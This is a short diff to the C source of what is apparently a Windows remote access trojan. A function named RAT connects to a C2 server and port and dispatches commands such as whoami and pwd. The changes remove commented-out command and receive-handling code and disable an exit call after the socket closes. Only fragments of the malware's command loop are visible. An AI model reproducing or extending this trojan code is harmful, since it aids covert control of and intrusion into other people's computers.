@@ -68,12 +68,6 @@ void pwd(char *returnval, int returnsize) // Module 2
     GetCurrentDirectoryA(MAX_PATH, tempvar);
     strcat(returnval, tempvar);
 }
-// void dir(char *returnval, int returnsize) // Module 2
-// {
-//     TCHAR tempvar[MAX_PATH];
-//     GetCurrentDirectory(MAX_PATH, tempvar);
-//     strcat(returnval, tempvar);
-// }
 
 DWORD getpid(){
 	DWORD pid;
@@ -153,17 +147,6 @@ void RAT(char* C2_Server, int C2_Port)
 
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
-
-                    // int RecvCode = recv(tcp_sock, RecvData, DEFAULT_BUFLEN, 0);
-
-                    // if (RecvCode <= 0) {
-                    //     closesocket(mySocket);
-                    //     WSACleanup();
-                    //     continue;
-                    // }
-                    // if (strcmp(RecvData, "EXIT\n") == 0) {
-                    //     continue;
-                    // }
                 }
                 else if ((strcmp(CommandReceived, "whoami") == 0))
                 {
@@ -199,7 +182,8 @@ void RAT(char* C2_Server, int C2_Port)
                 {
                     closesocket(tcp_sock);
                     WSACleanup();
-                    exit(0);
+                    
+                    //exit(0);
                 }
                 else
                 {
